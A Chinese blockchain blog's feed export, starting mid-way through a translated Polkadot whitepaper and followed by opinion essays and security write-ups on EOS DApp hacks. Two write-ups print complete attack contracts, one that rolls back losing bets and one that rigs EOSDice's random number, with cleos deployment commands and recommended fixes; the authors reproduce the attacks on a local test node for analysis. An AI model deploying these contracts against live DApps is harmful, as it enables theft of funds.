节点轮换的问题在基础协议的预案里，每个块的验证人小组随机变换，验证人被随机分配去验证某条平行链的交易。如何在不相关的节点间传递数据会是一个问题，这就必须依赖一个全分布式并且连接良好的节点网络，才能保证所需的跳跃距离（最坏的延迟）只按照网络规模（一个类似的 Kademlia 的协议会有帮助）的 log 级别增长，要么就必须延长区块时间，来支持必要的连接谈判，建立能够满足该节点当前通信需求的节点集合连接。 这些都不是好的方案：强迫变成更长的出块时间会让网络无法支持一些特定的程序或区块链。即使是一个完美公平的网络连接也会导致带宽浪费，因为要推送大量数据给不相关的节点，所以会影响到网络的伸缩功能。 然而这些方向都会促进问题的解决，一个可以降低延迟的优化方案是降低平行链验证人集合的易变性，在一段区块后才重新分配（比如 15 个区块，如果是 4s 的区块时间，那么只需要每分钟才重新连接），或者一段时间内只轮换一个验证人（例如如果有某条平行链分配了 15 个验证人，那么平均情况是一分钟内才全部轮换）。通过提高平行链局部的可预测性，来降低节点轮换的次数，并仍然保证连接的优势，我们就可以保证节点间连接的随机性。 6.8.2 通往高效网络协议的路径最高效和合理的开发方向是专注于改造一个现有协议而不是自己从头开发一个。我们将会探讨的几个点对点协议包括：以太坊的 devp2p、IPFS 的 libp2p、GNU 的 GNUnet。关于这些协议的全面介绍、以及其中关于如何打造一个能支持特定结构的模块化节点网络、动态节点转换、可扩展子协议等内容，本文也不做过多介绍，但这会是实现 Polkadot 的重要一步。 7 协议的可实践性7.1 跨链交易支付我们去除了以太坊那样的计算资源统计的 gas 机制，这虽然带来了更多的自由和简便性，但也引出了重要的问题：没有了 gas，一条平行链如何防止其他平行链逼迫他们做运算？然而我们可以依赖“交易提交”的入口队列缓存来阻止一条链给另一条链塞满交易数据，我们还没有提供其他相同效果的防垃圾机制。 这是个更高层面的待解决问题。由于链可以在“交易提交”中附属任何数据，我们需要保证在开始之前就支付计算费用。类似于以太坊 Serenity 版本中的一个提案，我们可以想象平行链有一个“内向”（break-in）合约来给验证人提供保证，付费换取特定数量的计算资源预分配。这些资源可能用类似 gas 的机制来度量，但也可能用完全不一样的概念模型，比如主观计算时间模型或类似比特币的一般计费模型。 无论“内向”合约定义什么价值模型，我们都不能简单假设链下调用器对他们是可用的，所以这个方案的用处也不大。然而我们可以想象在来源链里的第二个 “外向”（break-out）合约。这两个合约形成一个桥梁，相互认识并且提供等值交换（相互之间的权益代币可以用来支付结算）。调用其他链意味着要用这个桥梁做代理，可以通过谈判来协商如何支付目标平行链的计算资源消耗。 7.2 添加链添加一个平行链是相对比较便宜的操作，但并不免费。平行链越多意味着每个平行链的验证人就越少，更多的验证人又意味着每人的押金也会变少。通过渔夫缓解了强迫一条平行链的问题。由于共识机制本身的问题，增长中的验证人集合本质上导致了更高的延迟。将来每条平行链都可能给不幸的验证人造成很大的验证算法负担。因此，验证人和/或其他权益持有者将会对添加一条新链来定价。这个链的市场要么是如下两种： 对网络没有净贡献的链（通过锁币或烧毁权益代币的方式，比如联盟链、Doge链、特定应用链）； 通过提供一些别的地方没有的功能，能给网络带来更多价值的链（例如隐私性、内部伸缩性、内置服务） 我们最终会激励社区的权益持有者来添加子链——通过经济手段或根据给中继链添加功能的意愿程度。可预期的是刚添加进来的新链会有一个短暂的移除期，这就允许新链可以先试验，无需任何妥协和长期价值风险。 8 结论我们提出了一个异构多链协议的可能方向，它是可伸缩的且能够向后兼容目前已存在的区块链网络。在这个协议下，各参与方为了自身利益共同创造了一个完整系统，它可以用非常自由的方式来扩展，而且没有目前那些普通区块链对用户的固有成本。我们给出了这个架构的大体轮廓，包括需要的参与方角色、他们的经济激励模型和他们需要做的操作。我们已经弄清楚了一个基本的设计，并讨论了它的优势和限制；我们未来的方向就是消除这些限制，向完全可伸缩的区块链方案迈进。 8.1 遗漏的材料和开放问题网络设计一般都是从协议实现中分离出来的。还没有完全讨论网络如何从这种实验性的条件中恢复。网络需要一个确定性的非零时间，他们从中继链分叉中恢复过来应该也不是个大问题，然而需要小心地集成入共识协议中。 本文也没有具体探讨押金的没收和对应的奖励规则。目前我们假设提供的是赢者全拿（winner-takes-all）的奖励原则：但可能给渔夫最好的激励。一个短周期的提交-披露流程支持很多渔夫来索取赏金，进而达到一个更公平的奖励分配制度，但这个举报恶意行为的流程也将会引入更大的延迟。 8.2 鸣谢感谢那些帮助发表这篇框架性文章的校对者。特别提下 Peter Czaban、Ken Kappler、Robert Habermeier、 Vitalik Buterin、 Reto Trinkler 和 Jack Petersson。感谢那些贡献想法的人，特别提下 Marek Kotewicz 和 Aeron Buchanan。感谢其他所有提供过帮助的人。所有的错误仍都是我的。本文其中一部分的工作，包括对共识算法的初始调查，是由英国政府的 Innovate UK项目资助。 本文译者：岳利鹏是 ChainX CEO， ChainX 是一个跨链加密资产交易的金融系统，将在Polkadot上线后接入其中作为平行链运行。原始链接：https://chainx.org/polkadot_cn.pdf 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>跨链</category>
        <category>Polkadot</category>
      </categories>
      <tags>
        <tag>Polkadot</tag>
        <tag>白皮书</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EOS DApp 漏洞分析 - inline action 交易回滚攻击]]></title>
    <url>%2F2019%2F05%2F16%2Feos-DApp-revert%2F</url>
    <content type="text"><![CDATA[在去年（2018年）多个 EOS DAPP 发生了交易回滚攻击，这也是很典型的攻击方式，针对这个漏洞，深入浅出区块链社区伙伴零时科技安全团队进行了详细的分析及攻击过程复盘。 背景2018年12月，EOS上多个抽奖 DApp 被黑客攻击。黑客是采用了 inline action 回滚攻击的技术实施攻击，并获利数千EOS。 技术点：action有一些EOS 抽奖类 DApp 采用了 inline action 方式进行开奖，导致被黑客攻击。我们先来看一下 inline action和defer action分别是什么： action就是EOS上消息（EOS系统是以消息通信为基础的）的载体。如果想调用某个智能合约，那么就要给它发 action 消息。 inline action 内联交易：多个不同的action在一个transaction中（在一个交易中触发了后续多个 Action ），在这个 transaction 中，只要有一个 action 异常，则整个transaction 会失败，所有的 action 都将会回滚。 defer action 延迟交易：两个不同的action在两个transaction中，每个action的状态互相不影响。 攻击技术分析了解了上述知识之后，我们分析来黑客攻击流程： 首先，部署自己的攻击合约； 其次，在合约中进行下注操作； 随后，使用 inline action 查询自己的余额判断是否中奖，若未中奖，则抛出异常。此时，由于下注 action 和攻击的 action 在同一 transaction 中，那么，攻击action异常会导致下注的失败。那么黑客可以实现不中奖就不用付出EOS。 攻击合约下面，我们给出攻击的测试合约 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;utility&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;eosiolib/eosio.hpp&gt;#include &lt;eosiolib/time.hpp&gt;#include &lt;eosiolib/asset.hpp&gt;#include &lt;eosiolib/contract.hpp&gt;#include &lt;eosiolib/types.hpp&gt;#include &lt;eosiolib/transaction.hpp&gt;#include &lt;eosiolib/crypto.h&gt;#include &lt;boost/algorithm/string.hpp&gt;#include "eosio.token.hpp"using eosio::asset;using eosio::permission_level;using eosio::action;using eosio::print;using eosio::name;using eosio::unpack_action_data;using eosio::symbol_type;using eosio::transaction;using eosio::time_point_sec;class attack : public eosio::contract &#123; public: attack(account_name self):eosio::contract(self) &#123;&#125; //@abi action void rollback(asset in) &#123; require_auth(_self); asset pool = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name()); eosio_assert(in.amount &gt; pool.amount, "rollback"); &#125; //@abi action void hi(asset bet) &#123; require_auth(_self); asset pool = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name()); std::string memo = "dice-noneage-66-user"; action( permission_level(_self, N(active)), N(eosio.token), N(transfer), std::make_tuple(_self, N(eosbocai2222), bet, memo) ).send(); action( permission_level&#123;_self, N(active)&#125;, _self, N(rollback), std::make_tuple(pool) ).send(); &#125;&#125;;#define EOSIO_ABI_EX( TYPE, MEMBERS ) \extern "C" &#123; \ void apply( uint64_t receiver, uint64_t code, uint64_t action ) &#123; \ auto self = receiver; \ if( code == self || code == N(eosio.token)) &#123; \ if( action == N(transfer))&#123; \ eosio_assert( code == N(eosio.token), "Must transfer EOS"); \ &#125; \ TYPE thiscontract( self ); \ switch( action ) &#123; \ EOSIO_API( TYPE, MEMBERS ) \ &#125; \ /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \ &#125; \ &#125; \&#125;EOSIO_ABI_EX( attack, (hi)(rollback)) 由于开源的抽奖EOS DApp 采用 inline action 的较少，因此我们将 EOSDice 合约开奖的 defer action 改为了 inline action 来做测试。 攻击测试流程 创建相关账户并设置权限 123# 创建攻击者相关账户权限cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos set account permission attacker active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"attacker","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p attacker 向相关账户发送代币 12cleos push action eosio.token issue '["attacker", "10000.0000 EOS", "memo"]' -p eosiocleos push action eosio.token issue '["eosbocai2222", "10000.0000 EOS", "memo"]' -p eosio 编译并部署相关合约 12345678910111213# 编译攻击合约eosiocpp -o attack.wast attack.cppeosiocpp -g attack.abi attack.cpp# 部署攻击合约cleos set contract attacker ~/attack -p attacker@owner# 编译EOSDICE合约eosiocpp -o eosdice.wast eosbocai2222.cppeosiocpp -g eosdice.abi eosbocai2222.cpp# 部署EOSDICE合约cleos set code eosbocai2222 eosdice.wasm -p eosbocai2222@ownercleos set abi eosbocai2222 eosdice.abi -p eosbocai2222@owner 初始化测试合约 1cleos push action eosbocai2222 init '[""]' -p eosbocai2222 使用合约攻击测试DApp 1cleos push action attacker hi '["1.0000 EOS"]' -p attacker@owner 上图是开奖成功的正常流程 上图是开奖失败，合约攻击合约抛出异常，转账事务发生回滚。 推荐修复方法在抽奖DApp使用 defer action 进行开奖可以避免本文分析的inline action交易回滚攻击，但是链上开奖机制或许也不再安全。建议使用链下开奖逻辑进行开奖。 本文所有过程均在本地测试节点完成，文章用到的所有代码在NoneAge Github。 本文由深入浅出区块链社区合作伙伴-零时科技安全团队提供。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>回滚攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pos 会取代 Pow吗？]]></title>
    <url>%2F2019%2F05%2F15%2Fpos-replace-pow%2F</url>
    <content type="text"><![CDATA[Pos 会取代 Pow吗？ 自己的观点，欢迎留言讨论。 趋势？要说热点，POS 绝对算的上是今年比较大的一个。以太坊 2.0 号称要从 POW 转向 POS，跨链明星项目 Polkadot 和 Cosmos 也都是用的 POS 共识。各个去中心化钱包也纷纷宣称对 POS 更好的支持。 那么，这是否意味着 POW 已经过时，最终将会被 POS 取代呢？ 随着对 POS 的不断了解，感觉 POS 尽管使区块链网络的运行效率有所提高，使代币持有者可以通过直接参与区块验证或者间接通过权益委托的方式参与区块验证获取一部分增发收益，但也不是样样都比 POW 要好。 POS 之我见 POS 持币人所获取的收益大部分都是通过代币通胀获取的，从整体价值上来看，也许并不会有明显的价值增加。 POS 机制往往需要一些可信度较高的公开节点来作为验证节点，有违无需许可的去中心化特性。 POS 机制往往需要验证节点具有很高的在线率，如果共识过程有节点离线甚至有可能影响网络的正常出块，很难做到 POW 那种随时加入随时退出的去中心化程度。假设发生战争或者重大自然灾害，导致全网分区，经过一段时间后网络又恢复重连。这种情况下，对于POS一旦发生分区，如果形成多个链，网络恢复之后将无法判断哪个链是合法的，因为没有一个客观的标尺来判断。而对于POW则不存在这种问题，POW通过对两个链算力简单的判断，即可选择出合法的链。 POS 的 staking 集中度往往是很高的，并且相比于 POW 的矿池，这种集中度后来者更难超越，并且可以做的更隐蔽。在POS中，未来的共识群体是由今天的共识群体决定的。任何新的节点想要参与共识都需要通过至少一个交易来实现（e.g. 抵押，投票，etc.），而这个交易是否被处理是由今天的共识群体决定，他们可以处理这个交易，也可以不处理这个交易，如果不处理这个交易，新的节点永远都无法参与共识。 POS 基本都只能承受 1/3 的作恶节点，POW 可以承受 1/2 的作恶节点。 私钥攻击。对于POS，由于需要持有者需要时刻签名，所以私钥需要时刻在线。这种情况下，私钥就成为一个非常容易被攻击的点，一旦攻击者获得私钥，就可以获得签名权，做任何恶意处理。如果攻击者通过各种方式控制了大多数的私钥，最终可能会导致网络停止出块或者将持有者的押金罚沒（押金罚沒等同于矿场烧毁）。这也是 POS 验证节点的门槛之一，作为 POS 验证节点需要强度非常高的安全基础设施来保证节点安全性。 本文作者为深入浅出社区共建者 Ashton ，喜欢他的文章可关注他的简书。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>共识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信任人还是信任机制]]></title>
    <url>%2F2019%2F05%2F15%2Ftrust-what%2F</url>
    <content type="text"><![CDATA[来讨论一个信任人还是信任机制的问题？ 自己的观点，欢迎留言讨论。 信任的本源在于人？有朋友认为，信任的本源在于人而不在于机制，机制只是一种辅助手段。去中心只是提供了一种机制，而没有解决对人的信任本源问题解决。因为机制是人设计的，你说你建立了一个去中心化的网络，你也开源了你的代码，谁能保证你的这两个东西是一致的。所以说，不是我们建立了一个去中心化的平台网络，我们就建立了信任，而是要在这个网络建设的过程中，参与建设的人不断用行动去积累信任。 社会的发展是个逐步弱化对信任依赖的过程我认为，整个社会的发展，从家族的熟人社会到城市的陌生人社会，是一个消弱对信任依赖，加强对机制依赖的一个过程，机制是人设计的没错，好的机制是不受设计人制约而运行的，有独立的生命。验证网络和代码是否一致很简单，大家都用开源的代码去运行网络节点就好了，不存在开源是一套实际运行是另一套的问题，如果真的存在也是很容易被发现的。我们建立去中心化网络，不是要建立信任，而是要摆脱信任，信任都是有边界的，不可能与所有人建立信任。信任和影响力的建立是附带建立的，深度信任一定是少量并可贵的，弱信任也是在一定范围内的。 信任是对等的么在一个联盟链的活动上，有人分享了一个案例，讲如何让智能合约代码不被联盟成员看到，从而保护代码逻辑隐私。这里就有疑问了，智能合约代码不公开别的联盟成员怎么参与共识呢？ 这就涉及信任的对等性问题，有些信任就是不对等的。上面那个案例就是关于一个处于垄断地位国企的一个案例，其它联盟成员能资格加入就不错了，哪还有什么讨价还价的余地，加入联盟更多是为了受监管，说白了，联盟老大很强势，你要吃这碗饭就必须得相信他，而他则可以不相信你。这就是不对等的信任。 而对等的信任，更多是在实力相当的民企，更准确的说是对等的不信任，双方在各自领域都是老大哥，但某些业务也需要一些往来，这种情况下，联盟链的主要作用就是讲对等的不信任更多的转化为对等的信任，从而降低业务摩擦和对接成本。 区块链是可信的么最近还听到这么一个问题，客户领导不喜欢看到某个数据，想把这个数据删掉怎么办？可能这个领导有个根深蒂固的观念，认为系统都是人做的，数据都是可以删的。但在区块链系统中删除数据确实没那么容易，又与区块链系统的设计原则不符，但又不想让客户不高兴，怎么办？后来得出的办法是： 展现上下功夫，链上有记录不要紧，不显示出来不就行了么？ 采取类似与账务冲正的办法，再发笔交易去覆盖原来的那笔交易，但痕迹都会留下来 即使是区块链系统，特别是联盟链，你看到的不一定是真实的。 本文作者为深入浅出社区共建者 Ashton ，喜欢他的文章可关注他的简书。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>信任</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EOS DApp 随机数漏洞分析2 - EOSDice 随机数被操控]]></title>
    <url>%2F2019%2F05%2F14%2Feosdice-random2%2F</url>
    <content type="text"><![CDATA[EOSDice 在2018年11月10日再次受到黑客攻击，被盗4,633 EOS，约合 2.51 万美元，针对这个漏洞，零时科技团队进行了详细的分析及攻击过程复盘，尽管这个漏洞已经发生过一段时间，不过因随机数被预测依旧值得大家关注。 漏洞背景EOSDice 在上一次漏洞修复后，2018年11月10日再次受到黑客攻击，根据EOSDice官方通告，此次攻击共被盗4,633 EOS，约合 2.51 万美元（当时 1 EOS ≈ 5.42 USD）， 技术分析2018年11月3日，也就是一周前，EOSDice因为dApp中存在可被预测随机数漏洞被黑客攻击，在前一篇文章中已经分析过了黑客的攻击手法 EOS dApp 漏洞盘点-EOSDice弱随机数漏洞1。然而，上次的官方修复仍然存在问题，导致再次被黑客攻击。 我们再来分析一下EOSDice上次遭受攻击后官方的修复方法： 开奖action由一次defer改为两次defer 两次defer action代码在这个提交 。 我们做了一个两次defer action开奖示意图： 可以看到，通过两次defer action开奖的时候，开奖action的refer block为下注的block，下注前无法预测。 账户的余额用很多账户的总和加起来当成随机数种子 漏洞修复代码在这个提交 本次修改看似无懈可击，不过还有一点EOSDice官方没有想到。我们来看看eosio.token的转账代码。 可以看到，当A账户给B账户转账的时候，转账通知会先发送给A账户，再发送给B账户。那么，黑客可以部署一个攻击合约，当黑客通过此账号来进行游戏的时候，攻击合约肯定先于EOSDice官方合约收到转账通知。黑客可以同样做一个两次defer action来预测随机数 下图是利用攻击合约预测随机数。 可以看到，黑客完全可以通过攻击合约来预测随机数的结果。不过，问题来了由于使用了两次defer action进行开奖，那么这个结果是黑客无法在下注前得到的。因此，黑客要对EOSDice进行攻击只能另辟蹊径。 用户测试的攻击合约因为EOSDice中，随机数种子是很多账户余额的总和，黑客完全可以通过计算能让黑客稳赢的状态下这个余额的值，然后在给任意账户转账即可控制EOSDice的随机数结果。下面我们编写一个测试合约进行试验： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include &lt;utility&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;eosiolib/eosio.hpp&gt;#include &lt;eosiolib/time.hpp&gt;#include &lt;eosiolib/asset.hpp&gt;#include &lt;eosiolib/contract.hpp&gt;#include &lt;eosiolib/types.hpp&gt;#include &lt;eosiolib/transaction.hpp&gt;#include &lt;eosiolib/crypto.h&gt;#include &lt;boost/algorithm/string.hpp&gt;#include "eosio.token.hpp"#define EOS_SYMBOL S(4, EOS)using eosio::asset;using eosio::permission_level;using eosio::action;using eosio::print;using eosio::name;using eosio::unpack_action_data;using eosio::symbol_type;using eosio::transaction;using eosio::time_point_sec;class attack : public eosio::contract &#123; public: uint64_t id = 66; attack(account_name self):eosio::contract(self) &#123;&#125; uint8_t random(account_name name, uint64_t game_id, uint64_t add) &#123; auto eos_token = eosio::token(N(eosio.token)); asset pool_eos = eos_token.get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name()); asset ram_eos = eos_token.get_balance(N(eosio.ram), symbol_type(S(4, EOS)).name()); asset betdiceadmin_eos = eos_token.get_balance(N(betdiceadmin), symbol_type(S(4, EOS)).name()); asset newdexpocket_eos = eos_token.get_balance(N(newdexpocket), symbol_type(S(4, EOS)).name()); asset chintailease_eos = eos_token.get_balance(N(chintailease), symbol_type(S(4, EOS)).name()); asset eosbiggame44_eos = eos_token.get_balance(N(eosbiggame44), symbol_type(S(4, EOS)).name()); asset total_eos = asset(0, EOS_SYMBOL); total_eos = pool_eos + ram_eos + betdiceadmin_eos + newdexpocket_eos + chintailease_eos + eosbiggame44_eos; auto amount = total_eos.amount + add; auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + amount; print("[ATTACK RANDOM]tapos_block_prefix=&gt;",(uint64_t)tapos_block_prefix(),"|tapos_block_num=&gt;",(uint64_t)tapos_block_num(),"|name=&gt;",name,"|game_id=&gt;",game_id,"|current_time=&gt;",current_time(),"|total=&gt;",amount,"\n"); const char *mixedChar = reinterpret_cast&lt;const char *&gt;(&amp;mixd); checksum256 result; sha256((char *)mixedChar, sizeof(mixedChar), &amp;result); uint64_t random_num = *(uint64_t *)(&amp;result.hash[0]) + *(uint64_t *)(&amp;result.hash[8]) + *(uint64_t *)(&amp;result.hash[16]) + *(uint64_t *)(&amp;result.hash[24]); return (uint8_t)(random_num % 100 + 1); &#125; //@abi action void transfer(account_name from,account_name to,asset quantity,std::string memo) &#123; if (from == N(eosbocai2222)) &#123; return; &#125; transaction txn&#123;&#125;; txn.actions.emplace_back( action(eosio::permission_level(_self, N(active)), _self, N(reveal1), std::make_tuple(id) ) ); txn.delay_sec = 2; txn.send(now(), _self, false); print("[ATTACK] current_time =&gt; ", current_time(), "\n"); &#125; //@abi action void reveal1(uint64_t id) &#123; transaction txn&#123;&#125;; txn.actions.emplace_back( action(eosio::permission_level(_self, N(active)), _self, N(reveal2), std::make_tuple(id) ) ); txn.delay_sec = 2; txn.send(now(), _self, false); print("[ATTACK REVEAL1] current_time =&gt; ", current_time(), "\n"); &#125; //@abi action void reveal2(uint64_t id) &#123; std::string memo = "noneage"; print("[ATTACK REVEAL2] current_time =&gt; ", current_time(), "\n"); for(int i=0;i&lt;=100;i++) &#123; uint8_t r = random(_self, 87, i); if((uint64_t)r &lt; 6) &#123; print("[PREDICT RANDOM] random = ", (uint64_t)r, "\n"); if(i &gt; 0) &#123; action(permission_level(_self, N(active)), N(eosio.token), N(transfer), std::make_tuple(_self, N(eosbiggame44), asset(i, EOS_SYMBOL), memo)) .send(); &#125; break; &#125; &#125; &#125; &#125;;#define EOSIO_ABI_EX( TYPE, MEMBERS ) \extern "C" &#123; \ void apply( uint64_t receiver, uint64_t code, uint64_t action ) &#123; \ auto self = receiver; \ if( code == self || code == N(eosio.token)) &#123; \ if( action == N(transfer))&#123; \ eosio_assert( code == N(eosio.token), "Must transfer EOS"); \ &#125; \ TYPE thiscontract( self ); \ switch( action ) &#123; \ EOSIO_API( TYPE, MEMBERS ) \ &#125; \ /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \ &#125; \ &#125; \&#125;EOSIO_ABI_EX( attack, (transfer)(reveal1)(reveal2)) 在这个攻击合约里，我们模仿了EOSDice同样进行了两次defer action。在第二次defer action中，我们计算出随机数小于6的情况下，需要的总余额比原先的增加多少，然后利用一个inline action向eosbiggame44账户转账，因为攻击合约先于EOSDice官方合约执行，所以最终控制了EOSDice的随机数结果。 测试流程 创建相关账户并设置权限 123456789101112# 攻击者账户cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos set account permission attacker active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"attacker","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p attacker@owner# EOSDice 官方账户cleos create account eosio eosbocai2222 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos set account permission eosbocai2222 active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"eosbocai2222","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p eosbocai2222@owner# 其他需要的账户cleos create account eosio eosio.ram EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos create account eosio betdiceadmin EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos create account eosio newdexpocket EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos create account eosio chintailease EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos create account eosio eosbiggame44 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVk 向相关账户充值 1234567cleos push action eosio.token issue '["attacker", "1000.0000 EOS", "1"]' -p eosiocleos push action eosio.token issue '["eosbocai2222", "232323.2333 EOS", "1"]' -p eosiocleos push action eosio.token issue '["eosio.ram", "23.2333 EOS", "1"]' -p eosiocleos push action eosio.token issue '["betdiceadmin", "23.2333 EOS", "1"]' -p eosiocleos push action eosio.token issue '["newdexpocket", "23.2333 EOS", "1"]' -p eosiocleos push action eosio.token issue '["chintailease", "23.2333 EOS", "1"]' -p eosiocleos push action eosio.token issue '["eosbiggame44", "23.2333 EOS", "1"]' -p eosio 编译相关合约并部署 123456789101112# 编译攻击合约eosiocpp -o attack.wast attack.cppeosiocpp -g attack.abi attack.cpp# 部署攻击合约cleos set contract ~/attack -p attack@owner# 编译EOSDICE合约eosiocpp -o eosdice.wast eosbocai2222.cppeosiocpp -g eosdice.abi eosbocai2222.cpp# 部署EOSDICE合约cleos set code eosbocai2222 eosdice.wasm -p eosbocai2222@ownercleos set abi eosbocai2222 eosdice.abi -p eosbocai2222@owner 初始化EOSDice合约 1cleos push action eosbocai2222 init '[""]' -p eosbocai2222 进行游戏（测试） 1cleos push action eosio.token transfer '["attacker","eosbocai2222","1.0000 EOS", "dice-8-6-user"]' -p attacker@owner 查看测试结果现在，我们来看看测试结果 经过攻击合约多次计算，找到只需要余额比之前多 0.0021 EOS 即可让本次投注中奖，然后再向eosbiggame44转入了0.0021 EOS，最终中奖，获得了19.7000 EOS（投入1 EOS）。 可以看到，利用攻击合约来控制EOSDice的随机数，可以达到必中的效果！ 官方修复官方修复很简单，在随机数算法中将账户余额这个可控因子删除了。 上述的攻击合约便无法通过转账控制随机数的结果。 推荐修复方法如何得到安全的随机数是一个普遍的难题，在区块链上尤其困难，因为区块链上无法获取外部随机源。 关于区块链随机数，推荐阅读区块链上的随机性（一）概述与构造 及 区块链上的构建随机性的项目分析 要在区块链上选择一个无法被提前预知种子确实困难。零时科技安全专家推荐参考 EOS 官方的随机数生成方法来生成较为安全的随机数。 文章用到的所有代码均在github， 本文所有过程均在本地测试节点完成。 参考链接 eos 文档-生成随机数 eosdice 合约源码 EOS上如何安全生成随机数 本文由深入浅出区块链社区合作伙伴-零时科技安全团队提供。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>随机数</tag>
        <tag>EOS DApp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EOS DApp 随机数漏洞分析1 - EOSDice 随机数被预测]]></title>
    <url>%2F2019%2F05%2F14%2Feosdice-random1%2F</url>
    <content type="text"><![CDATA[EOSDice 在2018年11月3日受到黑客攻击，被盗2,545 EOS，约合 1.35 万美元，针对这个漏洞，零时科技团队进行了详细的分析及攻击过程复盘，尽管这个漏洞已经发生过一段时间，不过这个因随机数被预测引发的漏洞还是比较典型。 漏洞背景EOSDice 在2018年11月3日受到黑客攻击，根据 EOSDice 官方通告，此次攻击共被盗 2,545.1135 EOS，约 1.35 万美元，当时价格 1 EOS ≈ 5.13 USD），下图为交易截图： 技术分析由于EOSDice被攻击是因为该游戏的的随机数算法被破解，而且使用的defer action进行开奖。那我们具体分析一下EOSDice的随机数算法是否存在漏洞。 EOSDice 合约所使用的随机数因为EOSDice的合约已经开源，我们从 Github 合约源码 找到了EOSDice的随机数算法，代码如下： 12345678910111213uint8_t random(account_name name, uint64_t game_id)&#123; asset pool_eos = eosio::token(N(eosio.token)).get_balance(_self, symbol_type(S(4, EOS)).name()); auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount; const char *mixedChar = reinterpret_cast&lt;const char *&gt;(&amp;mixd); checksum256 result; sha256((char *)mixedChar, sizeof(mixedChar), &amp;result); uint64_t random_num = *(uint64_t *)(&amp;result.hash[0]) + *(uint64_t *)(&amp;result.hash[8]) + *(uint64_t *)(&amp;result.hash[16]) + *(uint64_t *)(&amp;result.hash[24]); return (uint8_t)(random_num % 100 + 1);&#125; 可以看到，EOSDice官方的随机数算法为6个随机数种子进行数学运算，再哈希，最后再进行一次数学运算。EOSDice官方选择的随机数种子为 tapos_block_prefix # ref block 的信息 tapos_block_num # ref block 的信息 account_name # 本合约的名字 game_id # 本次游戏的游戏id，从1自增 current_time # 当前开奖的时间戳 pool_eos # 本合约的EOS余额 随机数种子分析其中随机数种子account_name、game_id、pool_eos很容易获取到，那么如果需要预测随机数，必须要预测所有的随机数种子，也就是 说current_time、tapos_block_prefix、tapos_block_num也要可以预测。 那么，首先分析current_time是否可以预测 根据EOS官方的描述 其实返回的就是一个时间戳，由于EOSDice开奖使用的是defer action （延时交易），因此，我们只需要知道下注的action的时间戳再加上delay_sec就可以算出开奖reval的时间戳了。EOSDice的delay_sec为1秒，所以开奖时时间戳 = 下注时时间戳 + 1000000。 接着，我们分析tapos_block_prefix和tapos_block_num是否可以预测 注： tapos: Transactions as Proof-of-Stake (TaPOS) 它指定一个过去的区块（ ref_block_num ），用来做 Proof-of-Stake 的 ， 代码中使用的 tapos_block_preﬁx 和tapos_block_num， 正是由这个 ref_block_num 算出来的。 其实，tapos_block_prefix和tapos_block_num均为开奖block的ref block的信息。EOS为了防止分叉，所以每一个block都会有一个ref block也就是引用块。因为reveal开奖的块在下注前并不知道，它的ref block看似也不知道，所以貌似这两个种子是未来的值。不过，根据EOS的机制，因为开奖采用的是defer action，所以reveal开奖块的ref block为下注块的前一个块，也就是说tapos_block_prefix和tapos_block_num是在下注前可以获取到的！ 